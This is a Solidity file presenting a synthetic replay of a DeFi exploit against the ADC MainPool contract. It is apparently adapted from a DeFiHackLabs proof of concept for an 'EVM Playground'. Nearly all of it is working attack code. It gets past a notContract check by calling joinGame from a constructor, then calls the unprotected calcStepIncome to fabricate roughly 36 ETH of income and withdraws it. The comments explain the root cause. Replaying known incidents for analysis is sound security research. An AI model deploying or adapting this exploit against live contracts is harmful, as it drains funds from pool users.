// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-02-ADC).
//
// The DeFiHackLabs PoC (test/ADC_exp.sol) is two contracts: `Exploit`
// (testexploit() does `new Help{value: 18 ether}()`, then `Help.startwith()`)
// and `Help`, whose CONSTRUCTOR runs the whole heist — buyADC, joinGame, and
// the vulnerable calcStepIncome() — followed by a separate startwith() call
// that triggers withdraw(). This file mirrors that exact two-contract shape:
// `ADCDrain` is the `Exploit` analog (deployed with no logic; funded with 18
// ETH via `setup` — a plain CALL, which CAN carry value, unlike the
// playground's CREATE calls, which never do), and its `attack()` deploys a
// fresh `Help_` inner contract with `{value: 18 ether}` (spent from
// ADCDrain's own balance) exactly like `new Help{value: 18 ether}()`, then
// calls `startwith()` on it. Because this `new` happens INSIDE the recorded
// attack() call (not at the playground's own top-level deploy, which
// pre-dates the recorder attaching), the whole Help_ constructor sequence —
// including the vulnerable calcStepIncome() call — is captured in the
// recording. Logic and constants are copied verbatim from test/ADC_exp.sol.
//
// Gotcha this preserves: `MainPool.joinGame()` is gated by a
// `notContract(msg.sender)` modifier (`require(extcodesize(msg.sender) == 0)`).
// During CONSTRUCTION, `extcodesize(address(this))` is 0 (code isn't set
// until the constructor returns) — that is exactly why the original exploit
// could only call joinGame() from inside Help's constructor, and why this
// synthetic version must do the same (calling it from a post-deploy function
// on an already-deployed contract would revert).
//
// Root cause: MainPool.calcStepIncome(pid_, value_, dividendAccount_) is
// `public` with NO access control and no validation that `value_` reflects
// any real deposit or accrued income — it writes attacker-controlled `value_`
// straight into the player's `stepIncome` accumulator. `withdraw()` then pays
// that fabricated accumulator out as real ETH.

interface ITicket {
    function buyADC() external payable;
}

interface IMainPool {
    function joinGame(address parentAddr) external payable;
    function calcStepIncome(uint256 pid_, uint256 value_, uint8 dividendAccount_) external;
    function withdraw() external;
}

// `Help` analog. Its constructor is a faithful copy of test/ADC_exp.sol's
// `Help` constructor.
contract Help_ {
    ITicket constant tick = ITicket(0xaE2C7af5fc2dDF45e6250a4C5495e61afC7AcF50);
    IMainPool constant mainpool = IMainPool(0xdE46fcF6aB7559E4355b8eE3D7fBa0f2730CDdd8);

    constructor() payable {
        tick.buyADC{value: 3 ether}();
        // parentAddr = msg.sender (the deployer, ADCDrain) -- copied verbatim
        // from Help's constructor (`mainpool.joinGame{value: 15 ether}
        // (address(msg.sender))` in test/ADC_exp.sol). Passing address(this)
        // here instead reverts with "parent same as msg sender", since
        // msg.sender from THIS call's perspective is Help_ itself.
        mainpool.joinGame{value: 15 ether}(msg.sender);
        // vulnerability: MainPool.calcStepIncome has no access control and no
        // validation of `value_` — this fabricates 36.0999999999999999900 ETH
        // of "step income" for player 529 (this contract, registered above).
        mainpool.calcStepIncome(529, 36_099_999_999_999_999_900, 100);
    }

    // Moved verbatim from Help.startwith() in test/ADC_exp.sol.
    function startwith() external {
        mainpool.withdraw();
    }

    fallback() external payable {}
    receive() external payable {}
}

// `Exploit` analog. Deployed with no ETH; funded with 18 ETH via `setup`
// before attack() runs (mirrors `new Help{value: 18 ether}()` being called
// from a Foundry test contract that starts with a large default balance).
contract ADCDrain {
    Help_ public help;

    function attack() external {
        help = new Help_{value: 18 ether}();
        help.startwith();
    }

    fallback() external payable {}
    receive() external payable {}
}
